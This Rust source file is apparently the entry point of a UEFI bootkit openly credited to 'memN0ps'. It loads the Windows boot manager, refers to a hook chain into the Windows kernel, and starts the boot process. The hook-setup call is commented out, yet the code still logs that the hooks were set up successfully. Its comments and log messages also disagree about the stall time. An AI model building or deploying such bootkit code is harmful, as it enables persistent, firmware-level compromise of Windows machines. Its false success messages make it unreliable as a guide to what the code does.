#![no_main]
#![no_std]

use log;
use uefi::{prelude::*};

mod boot;

/* The image handle represents the currently-running executable, and the system table provides access to many different UEFI services. */
#[entry]
fn main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
    /* Setup a simple memory allocator, initialize logger, and provide panic handler. */
    uefi_services::init(&mut system_table).unwrap();

    /* Clear stdout/stderr output screen */
    system_table.stdout().clear().expect("Failed to clear the stdout output screen.");
    system_table.stderr().clear().expect("Failed to clear the stderr output screen.");

    log::info!("### UEFI Bootkit in Rust by memN0ps ###");

    let boot_services = system_table.boot_services();

    /* Locate and load Windows EFI Boot Manager (bootmgfw.efi) */
    let bootmgfw_handle = boot::utils::load_windows_boot_manager("\\EFI\\Microsoft\\Boot\\bootmgfw.efi", boot_services).expect("Failed to load image");
    log::info!("[+] Image Loaded Successfully!");

    /* Set up the hook chain from bootmgfw.efi -> windload.efi -> ntoskrnl.exe */
    //boot::hooks::setup_hooks(&bootmgfw_handle, &boot_services);
    log::info!("[+] Trampoline hooks setup successfully! (bootmgfw.efi -> windload.efi -> ntoskrnl.exe)");

    /* Start Windows EFI Boot Manager (bootmgfw.efi) */
    log::info!("[+] Starting image...");
    boot_services.start_image(bootmgfw_handle).expect("[-] Failed to start image");

    /* Make the system pause for 10 seconds */
    log::info!("Stalling the processor for 20 seconds");
    system_table.boot_services().stall(10_000_000);
    Status::SUCCESS
}
